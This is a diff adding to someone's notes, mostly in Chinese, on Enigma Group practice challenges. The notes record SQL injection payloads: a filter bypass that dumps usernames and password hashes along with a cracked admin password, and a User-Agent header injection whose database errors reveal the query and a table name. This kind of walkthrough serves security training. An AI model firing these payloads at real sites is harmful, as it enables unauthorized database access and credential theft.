@@ -44,6 +44,17 @@ CHALLENGES :http://www.enigmagroup.org/
         sql3: 绕过filter：
             /*!union*/ select 10,username,password from users-- ：输出administrator  6cfdca6f9633968c72a2a6e0fe2756ca（这个加了两次密）
             解密后密码：asdfgh
+
+        sql4: User agent SQL injection
+            修改 User Agent字段：
+            User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 AAA' or 1-- 
+            提交出现错误：
+            Could not successfully run query (INSERT INTO SQL4logs (ipaddress, useragent) VALUES(119.80.202.204, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 AAA' or 1--) from DB: 
+
+            继续修改：User-Agent: (select * from /*!information_sechma*/)
+            返回错误：Looking at the information_schema table is forbidden; however, if we did allow you, you could have found the tablename SQL4users.
+            
+
          
             
        
